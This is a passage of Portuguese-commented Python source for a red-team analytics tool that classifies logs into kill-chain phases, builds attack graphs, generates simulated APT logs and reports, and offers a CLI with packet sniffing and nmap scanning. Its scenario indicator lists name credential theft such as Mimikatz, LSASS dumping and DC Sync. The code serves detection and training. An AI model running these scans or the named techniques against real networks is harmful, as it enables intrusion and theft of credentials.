        """Detecta cadeias de ataque (Kill Chain)"""
        attack_chain = {
            'reconnaissance': [],
            'weaponization': [],
            'delivery': [],
            'exploitation': [],
            'installation': [],
            'command_control': [],
            'actions': []
        }
        
        for log in logs:
            # Classificar cada log na kill chain
            ttps = self.ttp_detector.detect_ttp(str(log))
            
            for ttp in ttps:
                tactic = ttp['tactic']
                
                if tactic == 'RECONNAISSANCE':
                    attack_chain['reconnaissance'].append({
                        'technique': ttp['technique_name'],
                        'evidence': ttp['evidence'],
                        'timestamp': log.get('timestamp', 'unknown')
                    })
                elif tactic in ['INITIAL_ACCESS', 'EXECUTION']:
                    attack_chain['exploitation'].append({
                        'technique': ttp['technique_name'],
                        'evidence': ttp['evidence'],
                        'timestamp': log.get('timestamp', 'unknown')
                    })
                elif tactic == 'PERSISTENCE':
                    attack_chain['installation'].append({
                        'technique': ttp['technique_name'],
                        'evidence': ttp['evidence'],
                        'timestamp': log.get('timestamp', 'unknown')
                    })
                elif tactic == 'COMMAND_AND_CONTROL':
                    attack_chain['command_control'].append({
                        'technique': ttp['technique_name'],
                        'evidence': ttp['evidence'],
                        'timestamp': log.get('timestamp', 'unknown')
                    })
                elif tactic in ['DISCOVERY', 'LATERAL_MOVEMENT']:
                    attack_chain['actions'].append({
                        'technique': ttp['technique_name'],
                        'evidence': ttp['evidence'],
                        'timestamp': log.get('timestamp', 'unknown')
                    })
        
        return attack_chain
    
    def build_attack_graph(self, logs: List[Dict]):
        """Constrói grafo de ataque"""
        self.attack_graph.clear()
        
        # Adicionar nós (IPs, usuários, sistemas)
        for log in logs:
            src_ip = log.get('source_ip', 'unknown')
            dst_ip = log.get('destination_ip', 'unknown')
            
            if src_ip != 'unknown':
                self.attack_graph.add_node(src_ip, type='ip')
            if dst_ip != 'unknown':
                self.attack_graph.add_node(dst_ip, type='ip')
            
            if src_ip != 'unknown' and dst_ip != 'unknown':
                # Adicionar aresta
                if self.attack_graph.has_edge(src_ip, dst_ip):
                    self.attack_graph[src_ip][dst_ip]['weight'] += 1
                    self.attack_graph[src_ip][dst_ip]['logs'].append(log)
                else:
                    self.attack_graph.add_edge(src_ip, dst_ip, weight=1, logs=[log])
        
        # Analisar grafo
        analysis = {
            'central_nodes': [],
            'clusters': [],
            'paths': []
        }
        
        if len(self.attack_graph.nodes()) > 0:
            # Encontrar nós centrais (betweenness centrality)
            centrality = nx.betweenness_centrality(self.attack_graph)
            top_central = sorted(centrality.items(), key=lambda x: x[1], reverse=True)[:5]
            
            for node, score in top_central:
                analysis['central_nodes'].append({
                    'node': node,
                    'centrality_score': score,
                    'degree': self.attack_graph.degree(node)
                })
            
            # Encontrar clusters (comunidades)
            try:
                from networkx.algorithms.community import greedy_modularity_communities
                communities = list(greedy_modularity_communities(self.attack_graph))
                
                for i, community in enumerate(communities[:5]):
                    analysis['clusters'].append({
                        'cluster_id': i,
                        'size': len(community),
                        'members': list(community)[:10]  # Limitar
                    })
            except:
                pass
        
        return analysis
    
    def simulate_red_team_scenario(self, scenario: str = 'apt29') -> Dict:
        """Simula cenários de Red Team"""
        scenarios = {
            'apt29': {
                'name': 'APT29 (Cozy Bear)',
                'description': 'Grupo associado à Rússia, foco em governos e think tanks',
                'ttps': ['T1190', 'T1133', 'T1059', 'T1078', 'T1003', 'T1021', 'T1048'],
                'indicators': [
                    'DOMAIN fronted HTTPS',
                    'Powershell Empire',
                    'Mimikatz usage',
                    'LSASS memory dumping',
                    'DC Sync attacks'
                ]
            },
            'carbon_spider': {
                'name': 'Carbon Spider (FIN6)',
                'description': 'Grupo financeiro, foco em POS systems e retail',
                'ttps': ['T1190', 'T1059', 'T1078', 'T1003', 'T1048'],
                'indicators': [
                    'Meterpreter sessions',
                    'Powershell encoded commands',
                    'Credential dumping',
                    'Lateral movement via SMB',
                    'Data exfiltration via FTP'
                ]
            },
            'lazarus': {
                'name': 'Lazarus Group',
                'description': 'Grupo norte-coreano, foco em bancos e criptomoedas',
                'ttps': ['T1190', 'T1059', 'T1003', 'T1048', 'T1489'],
                'indicators': [
                    'Macro-enabled documents',
                    'Shellcode injection',
                    'Process hollowing',
                    'Destructive malware',
                    'Disk wiping'
                ]
            }
        }
        
        if scenario not in scenarios:
            scenario = 'apt29'
        
        selected = scenarios[scenario]
        
        # Gerar logs simulados
        simulated_logs = self.generate_simulated_logs(selected['ttps'])
        
        return {
            'scenario': selected,
            'simulated_logs': simulated_logs[:50],  # Limitar
            'analysis': self.analyze_with_ai(pd.DataFrame(simulated_logs))
        }
    
    def generate_simulated_logs(self, ttps: List[str]) -> List[Dict]:
        """Gera logs simulados para treinamento/teste"""
        logs = []
        base_time = datetime.now() - timedelta(days=7)
        
        # IPs fictícios
        attacker_ips = ['192.168.1.100', '10.0.0.50', '172.16.0.25']
        target_ips = ['192.168.1.1', '10.0.0.1', '172.16.0.1']
        
        for i in range(100):  # Gerar 100 logs simulados
            timestamp = base_time + timedelta(minutes=i*10)
            src_ip = random.choice(attacker_ips)
            dst_ip = random.choice(target_ips)
            
            # Selecionar TTP aleatório
            ttp_id = random.choice(ttps)
            ttp_info = RedTeamTechniques.TECHNIQUES.get(ttp_id, {})
            
            log = {
                'timestamp': timestamp.isoformat(),
                'source_ip': src_ip,
                'destination_ip': dst_ip,
                'technique_id': ttp_id,
                'technique_name': ttp_info.get('name', 'Unknown'),
                'tactic': ttp_info.get('tactic', 'Unknown'),
                'message': f"Simulated {ttp_info.get('name', 'attack')} activity",
                'severity': random.choice(['low', 'medium', 'high', 'critical'])
            }
            
            logs.append(log)
        
        return logs
    
    def generate_attack_report(self, analysis_results: Dict) -> str:
        """Gera relatório detalhado de ataque"""
        report = f"""
╔══════════════════════════════════════════════════════════════╗
║                   RELATÓRIO DE ANÁLISE DE ATAQUE             ║
║                   PYFORENSIC-RED v3.0                        ║
╚══════════════════════════════════════════════════════════════╝

📅 Data da análise: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔍 Modo de operação: Red Team Analysis
📊 Total de logs analisados: {analysis_results.get('total_logs', 0)}

{'='*80}

🎯 DETECÇÕES DE TTPs (MITRE ATT&CK)
{'='*80}

"""
        
        # TTPs detectadas
        if 'ttps' in analysis_results:
            for ttp in analysis_results['ttps'][:10]:  # Top 10
                report += f"""
Técnica: {ttp.get('technique_name', 'N/A')}
ID: {ttp.get('technique_id', 'N/A')}
Tática: {ttp.get('tactic', 'N/A')}
Confiança: {ttp.get('confidence', 0):.2f}
Evidência: {ttp.get('evidence', 'N/A')[:100]}...
{'─'*40}
"""
        
        report += f"""
{'='*80}

🔗 CADEIA DE ATAQUE DETECTADA
{'='*80}

"""
        
        # Kill Chain
        if 'attack_chain' in analysis_results:
            chain = analysis_results['attack_chain']
            
            phases = ['reconnaissance', 'exploitation', 'installation', 
                     'command_control', 'actions']
            
            for phase in phases:
                if chain.get(phase):
                    report += f"\n🔸 {phase.upper()}: {len(chain[phase])} eventos"
                    for event in chain[phase][:3]:  # Top 3 por fase
                        report += f"""
   • {event.get('technique', 'N/A')}
     📅 {event.get('timestamp', 'N/A')}
     🔎 {event.get('evidence', 'N/A')[:50]}...
"""
        
        report += f"""
{'='*80}

🧠 ANÁLISE COM INTELIGÊNCIA ARTIFICIAL
{'='*80}

"""
        
        # Análise IA
        if 'ai_analysis' in analysis_results:
            ai = analysis_results['ai_analysis']
            
            if ai.get('anomalies'):
                report += f"\n🚨 Anomalias detectadas: {len(ai['anomalies'])}"
                for anomaly in ai['anomalies'][:5]:
                    report += f"""
   • Score: {anomaly.get('score', 0):.3f}
     Índice: {anomaly.get('index', 'N/A')}
"""
            
            if ai.get('behavioral_patterns'):
                report += f"\n🧩 Padrões comportamentais: {len(ai['behavioral_patterns'])}"
                for pattern in ai['behavioral_patterns'][:3]:
                    report += f"""
   • IP: {pattern.get('ip', 'N/A')}
     Requisições: {pattern.get('request_count', 0)}
     Flags: {', '.join(pattern.get('flags', []))}
"""
        
        report += f"""
{'='*80}

🌐 ANÁLISE DE REDE E RELACIONAMENTOS
{'='*80}

"""
        
        # Análise de rede
        if 'network_analysis' in analysis_results:
            net = analysis_results['network_analysis']
            
            if net.get('central_nodes'):
                report += "\n🎯 NÓS CENTRAIS (POSSÍVEIS COMANDANTES):"
                for node in net['central_nodes'][:3]:
                    report += f"""
   • {node.get('node', 'N/A')}
     Centralidade: {node.get('centrality_score', 0):.3f}
     Conexões: {node.get('degree', 0)}
"""
        
        report += f"""
{'='*80}

🎭 SIMULAÇÃO DE CENÁRIOS DE RED TEAM
{'='*80}

"""
        
        # Simulações
        if 'simulations' in analysis_results:
            for sim_name, sim_data in analysis_results['simulations'].items():
                report += f"""
🔮 CENÁRIO: {sim_data.get('name', 'N/A')}
📝 Descrição: {sim_data.get('description', 'N/A')}
🎯 TTPs esperadas: {', '.join(sim_data.get('ttps', []))}
"""
        
        report += f"""
{'='*80}

💡 RECOMENDAÇÕES DE MITIGAÇÃO
{'='*80}

1. 🔒 Implementar segmentação de rede para limitar movimento lateral
2. 👁️ Aumentar monitoramento nos nós centrais identificados
3. 🔄 Atualizar assinaturas de TTPs no SIEM
4. 🛡️ Implementar controles para técnicas detectadas:
   - Whitelisting de aplicações
   - Restrições de PowerShell
   - Monitoramento de criação de serviços
   - Detecção de dumping de credenciais
5. 🎯 Realizar exercícios de Purple Team baseados nos cenários simulados

{'='*80}

⚠️  CLASSIFICAÇÃO: RESTRITO - USO APENAS EM AMBIENTES AUTORIZADOS
📁 Artefatos salvos em: {analysis_results.get('output_dir', './forensic_results')}
🔗 Hash do relatório: {hashlib.sha256(report.encode()).hexdigest()}
{'='*80}
"""
        
        return report

class RedTeamCLI:
    """Interface de linha de comando para operações Red Team"""
    
    def __init__(self):
        self.analyzer = AdvancedLogAnalyzer()
        self.session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:8]
        self.session_start = datetime.now()
        
        # Configurar cores para terminal
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'bold': '\033[1m',
            'underline': '\033[4m',
            'end': '\033[0m'
        }
    
    def print_banner(self):
        """Exibe banner da ferramenta"""
        banner = f"""
{self.colors['red']}{self.colors['bold']}

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                    ▓
▓  ╔═╗╔═╗╔═╗╦ ╦╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╦═╗╔═╗╔╦╗  ╦═╗╔═╗╔╦╗╔═╗╦  ╔═╗╔═╗╔╦╗  ▓
▓  ╠═╝╠═╣╚═╗║ ║╠═╝ ║║║╣ ╠╦╝ ║   ╠╦╝╠═╣║║║  ╠╦╝║ ║ ║ ║╣ ║  ║╣ ║   ║   ▓
▓  ╩  ╩ ╩╚═╝╚═╝╩  ═╩╝╚═╝╩╚═ ╩   ╩╚═╩ ╩╩ ╩  ╩╚═╚═╝ ╩ ╚═╝╩═╝╚═╝ ╚═╝ ╩   ▓
▓                                                                    ▓
▓  OPERATION CRIMSON - RED TEAM ANALYTICS & SIMULATION              ▓
▓  SESSION: {self.session_id} | TIME: {self.session_start.strftime('%H:%M:%S')}               ▓
▓  VERSION: 3.0 | CLASSIFICATION: RESTRICTED                        ▓
▓                                                                    ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
{self.colors['end']}

⚠️  {self.colors['yellow']}AVISO: Esta ferramenta é apenas para ambientes autorizados{self.colors['end']}
🔐 {self.colors['cyan']}Uso não autorizado é ilegal e antiético{self.colors['end']}
"""
        print(banner)
    
    def print_menu(self):
        """Exibe menu principal"""
        menu = f"""
{self.colors['green']}{self.colors['bold']}╔══════════════════════════════════════════════════════════╗{self.colors['end']}
{self.colors['green']}{self.colors['bold']}║                  MENU PRINCIPAL - RED TEAM                ║{self.colors['end']}
{self.colors['green']}{self.colors['bold']}╚══════════════════════════════════════════════════════════╝{self.colors['end']}

{self.colors['cyan']}[1]{self.colors['end']} 📊 Análise Forense Avançada
{self.colors['cyan']}[2]{self.colors['end']} 🎯 Detecção de TTPs (MITRE ATT&CK)
{self.colors['cyan']}[3]{self.colors['end']} 🔗 Análise de Cadeia de Ataque
{self.colors['cyan']}[4]{self.colors['end']} 🧠 Análise com IA/ML
{self.colors['cyan']}[5]{self.colors['end']} 🌐 Análise de Rede
{self.colors['cyan']}[6]{self.colors['end']} 🎭 Simulação de Cenários
{self.colors['cyan']}[7]{self.colors['end']} 🔐 Operações Criptográficas
{self.colors['cyan']}[8]{self.colors['end']} 🖥️  Pós-Exploração (SIMULADO)
{self.colors['cyan']}[9]{self.colors['end']} 🎨 Esteganografia
{self.colors['cyan']}[0]{self.colors['end']} 📁 Gerenciamento de Artefatos

{self.colors['red']}[99]{self.colors['end']} 🚪 Sair
{self.colors['yellow']}[?]{self.colors['end']} Ajuda

{self.colors['white']}Selecione uma opção:{self.colors['end']} """
        
        return menu
    
    def run(self):
        """Executa a interface CLI"""
        self.print_banner()
        
        while True:
            try:
                print(self.print_menu())
                choice = input().strip()
                
                if choice == '1':
                    self.forensic_analysis()
                elif choice == '2':
                    self.ttp_detection()
                elif choice == '3':
                    self.attack_chain_analysis()
                elif choice == '4':
                    self.ai_analysis()
                elif choice == '5':
                    self.network_analysis()
                elif choice == '6':
                    self.scenario_simulation()
                elif choice == '7':
                    self.crypto_operations()
                elif choice == '8':
                    self.post_exploitation()
                elif choice == '9':
                    self.steganography_ops()
                elif choice == '0':
                    self.artifact_management()
                elif choice == '99':
                    print(f"\n{self.colors['yellow']}Encerrando sessão {self.session_id}...{self.colors['end']}")
                    break
                elif choice == '?':
                    self.show_help()
                else:
                    print(f"\n{self.colors['red']}Opção inválida!{self.colors['end']}")
                
                input(f"\n{self.colors['cyan']}Pressione Enter para continuar...{self.colors['end']}")
                
            except KeyboardInterrupt:
                print(f"\n\n{self.colors['yellow']}Interrompido pelo usuário.{self.colors['end']}")
                break
            except Exception as e:
                print(f"\n{self.colors['red']}Erro: {e}{self.colors['end']}")
    
    def forensic_analysis(self):
        """Análise forense avançada"""
        print(f"\n{self.colors['cyan']}=== ANÁLISE FORENSE AVANÇADA ==={self.colors['end']}")
        
        log_file = input("Caminho do arquivo de log: ").strip()
        
        if not os.path.exists(log_file):
            print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
            return
        
        print(f"\n{self.colors['yellow']}Analisando...{self.colors['end']}")
        
        try:
            # Carregar logs
            with open(log_file, 'r') as f:
                logs = [line.strip() for line in f.readlines() if line.strip()]
            
            # Converter para DataFrame para análise
            import pandas as pd
            log_data = []
            
            for i, line in enumerate(logs[:10000]):  # Limitar para performance
                # Parse básico (simplificado)
                entry = {
                    'line_number': i,
                    'content': line,
                    'timestamp': datetime.now().isoformat(),  # Placeholder
                    'source_ip': self.extract_ip(line)
                }
                log_data.append(entry)
            
            df = pd.DataFrame(log_data)
            
            # Executar análise
            results = self.analyzer.analyze_with_ai(df)
            
            # Exibir resultados
            print(f"\n{self.colors['green']}✓ Análise concluída!{self.colors['end']}")
            print(f"📊 Logs processados: {len(df)}")
            print(f"🚨 Anomalias detectadas: {len(results['anomalies'])}")
            print(f"🧩 Padrões comportamentais: {len(results['behavioral_patterns'])}")
            
            if results['anomalies']:
                print(f"\n{self.colors['red']}TOP ANOMALIAS:{self.colors['end']}")
                for anomaly in results['anomalies'][:5]:
                    print(f"  • Score: {anomaly['score']:.3f} - Linha: {anomaly['index']}")
                    print(f"    {anomaly['data'].get('content', '')[:80]}...")
            
            # Salvar resultados
            output_file = f"forensic_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(output_file, 'w') as f:
                json.dump({
                    'metadata': {
                        'file': log_file,
                        'analysis_date': datetime.now().isoformat(),
                        'total_logs': len(df)
                    },
                    'results': results
                }, f, indent=2, default=str)
            
            print(f"\n{self.colors['cyan']}📁 Resultados salvos em: {output_file}{self.colors['end']}")
            
        except Exception as e:
            print(f"{self.colors['red']}Erro na análise: {e}{self.colors['end']}")
    
    def extract_ip(self, text: str) -> str:
        """Extrai IP de texto"""
        ip_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        match = re.search(ip_pattern, text)
        return match.group() if match else 'unknown'
    
    def ttp_detection(self):
        """Detecção de TTPs"""
        print(f"\n{self.colors['cyan']}=== DETECÇÃO DE TTPS (MITRE ATT&CK) ==={self.colors['end']}")
        
        print("\n1. Analisar arquivo de log")
        print("2. Analisar diretório de logs")
        print("3. Inserir texto manualmente")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            log_file = input("Caminho do arquivo: ").strip()
            if not os.path.exists(log_file):
                print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                return
            
            with open(log_file, 'r') as f:
                content = f.read()
        
        elif choice == '2':
            log_dir = input("Caminho do diretório: ").strip()
            if not os.path.exists(log_dir):
                print(f"{self.colors['red']}Diretório não encontrado!{self.colors['end']}")
                return
            
            content = ""
            for file in os.listdir(log_dir)[:10]:  # Limitar
                file_path = os.path.join(log_dir, file)
                if os.path.isfile(file_path):
                    try:
                        with open(file_path, 'r') as f:
                            content += f.read()[:10000]  # Limitar por arquivo
                    except:
                        continue
        
        elif choice == '3':
            print("\nCole o texto para análise (Ctrl+D para finalizar):")
            content = ""
            try:
                while True:
                    line = input()
                    content += line + "\n"
            except EOFError:
                pass
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
            return
        
        # Detectar TTPs
        print(f"\n{self.colors['yellow']}Detectando TTPs...{self.colors['end']}")
        
        # Dividir em linhas para análise
        lines = content.split('\n')
        detected_ttps = []
        
        for line in lines[:1000]:  # Limitar análise
            if line.strip():
                ttps = RedTeamTechniques.detect_ttp(line)
                detected_ttps.extend(ttps)
        
        # Agrupar por técnica
        grouped = {}
        for ttp in detected_ttps:
            tech_id = ttp['technique_id']
            if tech_id not in grouped:
                grouped[tech_id] = {
                    'count': 0,
                    'examples': [],
                    'info': RedTeamTechniques.TECHNIQUES.get(tech_id, {})
                }
            grouped[tech_id]['count'] += 1
            if len(grouped[tech_id]['examples']) < 3:
                grouped[tech_id]['examples'].append(ttp['evidence'][:100])
        
        # Exibir resultados
        print(f"\n{self.colors['green']}✓ TTPs detectadas: {len(detected_ttps)}{self.colors['end']}")
        print(f"🎯 Técnicas únicas: {len(grouped)}")
        
        if grouped:
            print(f"\n{self.colors['yellow']}TÉCNICAS DETECTADAS:{self.colors['end']}")
            for tech_id, data in sorted(grouped.items(), key=lambda x: x[1]['count'], reverse=True)[:10]:
                info = data['info']
                print(f"\n{self.colors['cyan']}▶ {tech_id}: {info.get('name', 'Unknown')}{self.colors['end']}")
                print(f"  Tática: {info.get('tactic', 'Unknown')}")
                print(f"  Ocorrências: {data['count']}")
                if data['examples']:
                    print(f"  Exemplos: {data['examples'][0]}...")
        
        # Salvar resultados
        output_file = f"ttp_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(output_file, 'w') as f:
            json.dump({
                'analysis_date': datetime.now().isoformat(),
                'total_lines_analyzed': len(lines),
                'detected_ttps': detected_ttps[:50],  # Limitar
                'grouped_ttps': grouped
            }, f, indent=2)
        
        print(f"\n{self.colors['cyan']}📁 Resultados salvos em: {output_file}{self.colors['end']}")
    
    def attack_chain_analysis(self):
        """Análise de cadeia de ataque"""
        print(f"\n{self.colors['cyan']}=== ANÁLISE DE CADEIA DE ATAQUE ==={self.colors['end']}")
        
        # Carregar logs de exemplo ou do usuário
        print("\n1. Usar dados de exemplo (APT29)")
        print("2. Carregar arquivo de logs")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            # Gerar dados de exemplo
            simulation = self.analyzer.simulate_red_team_scenario('apt29')
            logs = simulation['simulated_logs']
            print(f"{self.colors['yellow']}Usando dados simulados (APT29){self.colors['end']}")
        
        elif choice == '2':
            log_file = input("Caminho do arquivo: ").strip()
            if not os.path.exists(log_file):
                print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                return
            
            # Carregar e parsear logs
            logs = self.load_and_parse_logs(log_file)
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
            return
        
        # Analisar cadeia de ataque
        print(f"\n{self.colors['yellow']}Analisando cadeia de ataque...{self.colors['end']}")
        
        attack_chain = self.analyzer.detect_attack_chain(logs)
        graph_analysis = self.analyzer.build_attack_graph(logs)
        
        # Exibir resultados
        print(f"\n{self.colors['green']}✓ Análise concluída!{self.colors['end']}")
        
        # Kill Chain
        print(f"\n{self.colors['cyan']}🔗 KILL CHAIN DETECTADA:{self.colors['end']}")
        
        phases = {
            'reconnaissance': '🔍 Reconhecimento',
            'exploitation': '⚡ Exploração',
            'installation': '🏗️  Instalação',
            'command_control': '🎮 Comando & Controle',
            'actions': '🎯 Ações no Objetivo'
        }
        
        for phase_key, phase_name in phases.items():
            events = attack_chain.get(phase_key, [])
            if events:
                print(f"\n{phase_name}: {len(events)} eventos")
                for event in events[:2]:  # Top 2
                    print(f"  • {event.get('technique', 'N/A')}")
                    print(f"    ⏰ {event.get('timestamp', 'N/A')}")
        
        # Análise de grafo
        if graph_analysis.get('central_nodes'):
            print(f"\n{self.colors['cyan']}🌐 NÓS CENTRAIS (ANÁLISE DE REDE):{self.colors['end']}")
            for node in graph_analysis['central_nodes'][:3]:
                print(f"  • {node['node']} (centralidade: {node['centrality_score']:.3f})")
        
        # Gerar relatório
        report = self.analyzer.generate_attack_report({
            'total_logs': len(logs),
            'attack_chain': attack_chain,
            'network_analysis': graph_analysis,
            'output_dir': './attack_analysis'
        })
        
        # Salvar relatório
        report_file = f"attack_chain_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write(report)
        
        print(f"\n{self.colors['cyan']}📄 Relatório gerado: {report_file}{self.colors['end']}")
        print(f"\n{self.colors['yellow']}Visualização do relatório:{self.colors['end']}")
        print("-" * 80)
        print(report[:500] + "...")  # Mostrar início do relatório
    
    def load_and_parse_logs(self, log_file: str) -> List[Dict]:
        """Carrega e parseia logs"""
        logs = []
        
        try:
            with open(log_file, 'r') as f:
                for i, line in enumerate(f):
                    if i >= 1000:  # Limitar para performance
                        break
                    
                    if line.strip():
                        # Parse básico
                        entry = {
                            'line_number': i,
                            'content': line.strip(),
                            'timestamp': datetime.now().isoformat(),
                            'source_ip': self.extract_ip(line),
                            'destination_ip': 'unknown'
                        }
                        
                        # Tentar detectar TTP
                        ttps = RedTeamTechniques.detect_ttp(line)
                        if ttps:
                            entry['ttp'] = ttps[0]
                        
                        logs.append(entry)
        except Exception as e:
            print(f"{self.colors['red']}Erro ao carregar logs: {e}{self.colors['end']}")
        
        return logs
    
    def ai_analysis(self):
        """Análise com IA/ML"""
        print(f"\n{self.colors['cyan']}=== ANÁLISE COM INTELIGÊNCIA ARTIFICIAL ==={self.colors['end']}")
        
        if not PLOTTING_AVAILABLE:
            print(f"\n{self.colors['red']}Bibliotecas de ML não disponíveis!{self.colors['end']}")
            print("Instale: pip install scikit-learn pandas numpy")
            return
        
        # Gerar ou carregar dados
        print("\n1. Gerar dados de treinamento")
        print("2. Carregar arquivo CSV")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            # Gerar dados sintéticos
            data = self.generate_training_data()
            print(f"{self.colors['green']}✓ Dados gerados: {len(data)} amostras{self.colors['end']}")
        
        elif choice == '2':
            csv_file = input("Caminho do arquivo CSV: ").strip()
            if not os.path.exists(csv_file):
                print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                return
            
            try:
                import pandas as pd
                data = pd.read_csv(csv_file)
                print(f"{self.colors['green']}✓ Dados carregados: {len(data)} linhas{self.colors['end']}")
            except Exception as e:
                print(f"{self.colors['red']}Erro ao carregar CSV: {e}{self.colors['end']}")
                return
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
            return
        
        # Executar análise
        print(f"\n{self.colors['yellow']}Executando análise com IA...{self.colors['end']}")
        
        try:
            results = self.analyzer.analyze_with_ai(data)
            
            # Exibir resultados
            print(f"\n{self.colors['green']}✓ Análise concluída!{self.colors['end']}")
            
            if results['anomalies']:
                print(f"\n{self.colors['red']}🚨 ANOMALIAS DETECTADAS:{self.colors['end']}")
                print(f"Total: {len(results['anomalies'])}")
                
                # Estatísticas
                scores = [a['score'] for a in results['anomalies']]
                print(f"Score médio: {np.mean(scores):.3f}")
                print(f"Score máximo: {np.max(scores):.3f}")
                
                print(f"\n{self.colors['yellow']}TOP 5 ANOMALIAS:{self.colors['end']}")
                for anomaly in sorted(results['anomalies'], key=lambda x: x['score'], reverse=True)[:5]:
                    print(f"  • Score: {anomaly['score']:.3f} - Índice: {anomaly['index']}")
            
            if results['clusters']:
                print(f"\n{self.colors['cyan']}🧩 CLUSTERS DETECTADOS:{self.colors['end']}")
                for cluster in results['clusters']:
                    print(f"  • Cluster {cluster['cluster_id']}: {cluster['size']} amostras")
            
            if results['behavioral_patterns']:
                print(f"\n{self.colors['magenta']}🎭 PADRÕES COMPORTAMENTAIS:{self.colors['end']}")
                for pattern in results['behavioral_patterns'][:3]:
                    print(f"  • IP: {pattern['ip']}")
                    print(f"    Requisições: {pattern['request_count']}")
                    if pattern.get('flags'):
                        print(f"    Flags: {', '.join(pattern['flags'])}")
            
            # Salvar resultados
            output_file = f"ai_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(output_file, 'w') as f:
                json.dump({
                    'analysis_date': datetime.now().isoformat(),
                    'data_shape': data.shape if hasattr(data, 'shape') else 'unknown',
                    'results': results
                }, f, indent=2, default=str)
            
            print(f"\n{self.colors['cyan']}📁 Resultados salvos em: {output_file}{self.colors['end']}")
            
        except Exception as e:
            print(f"{self.colors['red']}Erro na análise com IA: {e}{self.colors['end']}")
    
    def generate_training_data(self):
        """Gera dados de treinamento sintéticos"""
        import pandas as pd
        import numpy as np
        
        # Gerar dados normais
        np.random.seed(42)
        n_samples = 1000
        
        # Features
        data = {
            'hour': np.random.randint(0, 24, n_samples),
            'day': np.random.randint(0, 7, n_samples),
            'status_code': np.random.choice([200, 404, 500], n_samples, p=[0.9, 0.08, 0.02]),
            'size': np.random.exponential(500, n_samples),
            'duration': np.random.exponential(1, n_samples)
        }
        
        # Adicionar anomalias
        n_anomalies = 50
        anomaly_indices = np.random.choice(n_samples, n_anomalies, replace=False)
        
        for idx in anomaly_indices:
            # Tornar anomalias diferentes
            if np.random.random() > 0.5:
                data['status_code'][idx] = np.random.choice([401, 403, 418])
                data['size'][idx] = np.random.exponential(5000)
            else:
                data['hour'][idx] = np.random.choice([2, 3, 4])  # Horas estranhas
                data['duration'][idx] = np.random.exponential(10)
        
        return pd.DataFrame(data)
    
    def network_analysis(self):
        """Análise de rede"""
        print(f"\n{self.colors['cyan']}=== ANÁLISE DE REDE ==={self.colors['end']}")
        
        if not SCAPY_AVAILABLE:
            print(f"\n{self.colors['red']}Scapy não disponível!{self.colors['end']}")
            print("Instale: pip install scapy")
            return
        
        print("\n1. Sniff de pacotes (captura)")
        print("2. Analisar arquivo pcap")
        print("3. Escanear rede")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            interface = input("Interface de rede (deixe vazio para default): ").strip() or None
            count = input("Número de pacotes [100]: ").strip()
            count = int(count) if count.isdigit() else 100
            
            print(f"\n{self.colors['yellow']}Capturando {count} pacotes...{self.colors['end']}")
            print(f"{self.colors['red']}⚠️  Pressione Ctrl+C para parar{self.colors['end']}")
            
            try:
                packets = self.analyzer.network_ops.sniff_traffic(interface, count)
                print(f"{self.colors['green']}✓ Capturados {len(packets)} pacotes{self.colors['end']}")
                
                # Analisar
                analysis = self.analyzer.network_ops.analyze_packets(packets)
                self.display_network_analysis(analysis)
                
                # Salvar pcap
                pcap_file = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
                scapy.wrpcap(pcap_file, packets)
                print(f"\n{self.colors['cyan']}📁 Captura salva em: {pcap_file}{self.colors['end']}")
                
            except KeyboardInterrupt:
                print(f"\n{self.colors['yellow']}Captura interrompida pelo usuário.{self.colors['end']}")
            except Exception as e:
                print(f"{self.colors['red']}Erro na captura: {e}{self.colors['end']}")
        
        elif choice == '2':
            pcap_file = input("Caminho do arquivo pcap: ").strip()
            if not os.path.exists(pcap_file):
                print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                return
            
            try:
                packets = scapy.rdpcap(pcap_file)
                print(f"{self.colors['green']}✓ Carregados {len(packets)} pacotes{self.colors['end']}")
                
                # Analisar
                analysis = self.analyzer.network_ops.analyze_packets(packets[:1000])  # Limitar
                self.display_network_analysis(analysis)
                
            except Exception as e:
                print(f"{self.colors['red']}Erro ao analisar pcap: {e}{self.colors['end']}")
        
        elif choice == '3':
            if not NMAP_AVAILABLE:
                print(f"\n{self.colors['red']}nmap não disponível!{self.colors['end']}")
                print("Instale: pip install python-nmap")
                return
            
            subnet = input("Rede/subnet (ex: 192.168.1.0/24): ").strip()
            ports = input("Portas (deixe vazio para comum): ").strip()
            
            print(f"\n{self.colors['yellow']}Escaneando {subnet}...{self.colors['end']}")
            
            try:
                results = self.analyzer.network_ops.scan_network(
                    subnet, 
                    ports if ports else None
                )
                
